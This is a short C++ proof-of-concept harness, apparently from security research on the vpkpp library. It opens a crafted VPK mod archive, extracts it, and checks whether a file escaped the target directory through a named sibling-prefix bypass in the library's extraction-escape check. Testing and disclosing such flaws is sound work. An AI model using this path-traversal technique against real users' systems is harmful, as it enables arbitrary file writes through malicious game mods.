// Chain PoC harness — extraction escape (C5).
// Opens a hostile mod VPK and extractAll()s it; one entry path uses the
// sibling-prefix bypass in checkForExtractionEscapeAttempt (PackFile.cpp:110)
// to land outside the extraction directory.
#include <cstdio>
#include <filesystem>

#include <vpkpp/format/VPK.h>

using namespace vpkpp;

int main(int argc, char** argv) {
	const auto vpkPath = argc > 1 ? argv[1] : "/home/box/sourcepp-hunt/poc/chain-mod.vpk";
	const auto outDir  = argc > 2 ? argv[2] : "/home/box/sourcepp-hunt/poc/extract_target";
	std::printf("[*] opening %s\n", vpkPath);
	auto packFile = VPK::open(vpkPath);
	if (!packFile) { std::printf("[!] open returned nullptr\n"); return 1; }
	std::printf("[*] entries in archive:\n");
	packFile->runForAllEntries([](const std::string& path, const Entry&) {
		std::printf("      '%s'\n", path.c_str());
	});
	std::printf("[*] extractAll -> %s\n", outDir);
	const bool ok = packFile->extractAll(outDir, false);
	std::printf("[*] extractAll returned %s\n", ok ? "true" : "false");
	const std::string escapee = std::string{outDir} + "X/pwned.txt";
	std::printf("[%s] escape file present: %s (%zu bytes)\n",
	            std::filesystem::exists(escapee) ? "!!" : "--",
	            escapee.c_str(),
	            std::filesystem::exists(escapee) ? std::filesystem::file_size(escapee) : 0);
	return std::filesystem::exists(escapee) ? 42 : 0;
}